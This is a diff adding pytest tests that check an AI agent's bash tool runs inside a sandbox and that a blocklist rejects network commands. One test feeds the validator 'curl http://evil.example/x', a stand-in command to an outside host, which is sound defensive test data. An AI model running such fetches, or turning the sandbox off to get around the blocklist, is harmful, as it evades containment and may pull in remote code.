@@ -137,3 +137,46 @@ def test_run_docker_mode_wraps_command(tmp_path, monkeypatch):
     sandbox.run(["pytest", "-q"], str(tmp_path))
     assert seen["cmd"][:2] == ["docker", "run"]
     assert "--network=none" in seen["cmd"]
+
+
+# --------------------------------------------- miner agent bash tool
+
+def test_agent_bash_routes_through_sandbox(tmp_path, monkeypatch):
+    from miner import tools
+
+    tools.configure(str(tmp_path), allowed_files=["a.py"])
+    seen = {}
+
+    def fake_sandboxed_run(cmd, repo_root, env=None, timeout=300,
+                            cwd=None):
+        seen["cmd"] = cmd
+        seen["repo_root"] = repo_root
+        return subprocess.CompletedProcess(cmd, 0, stdout="ok",
+                                            stderr="")
+
+    monkeypatch.setattr(sandbox, "run", fake_sandboxed_run)
+    out = tools.execute_bash({"command": "echo ok"})
+    assert seen["cmd"] == ["sh", "-c", "echo ok"]
+    assert seen["repo_root"] == str(tmp_path)
+    assert "[exit code: 0]" in out
+
+
+def test_agent_bash_host_mode_semantics(tmp_path, monkeypatch):
+    from miner import tools
+
+    monkeypatch.setenv("BITSWARM_SANDBOX", "off")
+    tools.configure(str(tmp_path), allowed_files=["a.py"])
+    out = tools.execute_bash({"command": "echo hello && pwd"})
+    assert "hello" in out
+    assert str(tmp_path) in out
+    assert "[exit code: 0]" in out
+
+
+def test_agent_bash_blocklist_still_applies():
+    from miner.tools import validate_bash
+
+    ok, why = validate_bash({"command": "curl http://evil.example/x"})
+    assert ok is False
+    assert "curl" in why
+    ok, _ = validate_bash({"command": "python -m pytest tests/"})
+    assert ok is True
